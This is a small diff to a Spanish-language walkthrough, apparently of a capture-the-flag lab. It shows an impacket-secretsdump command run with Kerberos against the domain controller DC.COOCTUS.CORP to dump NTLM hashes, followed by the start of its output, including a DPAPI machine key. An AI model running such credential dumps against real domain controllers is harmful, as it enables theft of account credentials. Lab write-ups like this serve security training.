@@ -197,7 +197,6 @@ Una vez que hayamos hecho eso, debería volcar con éxito los hashes NTLM del us
 
 el hash que colocaras tendria que ser este:
 ❯ impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ```yam
 [*] DPAPI_SYSTEM 
 dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
